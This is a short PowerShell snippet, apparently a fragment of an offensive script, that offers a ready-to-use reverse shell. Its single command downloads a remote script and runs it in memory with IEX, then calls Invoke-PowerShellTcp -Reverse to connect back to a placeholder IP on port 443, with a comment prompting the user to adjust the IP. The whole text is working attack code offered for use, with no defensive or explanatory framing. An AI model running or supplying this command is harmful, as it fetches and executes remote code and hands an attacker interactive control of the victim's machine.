<#
   You can use this to get a reverse powershell. 
...
IEX([Net.Webclient]::new().DownloadString($url)); Invoke-PowerShellTcp -Reverse -IPAddress XXX.XXX.XXX.XXX -Port 443. # <------- Adjust the IP! -------
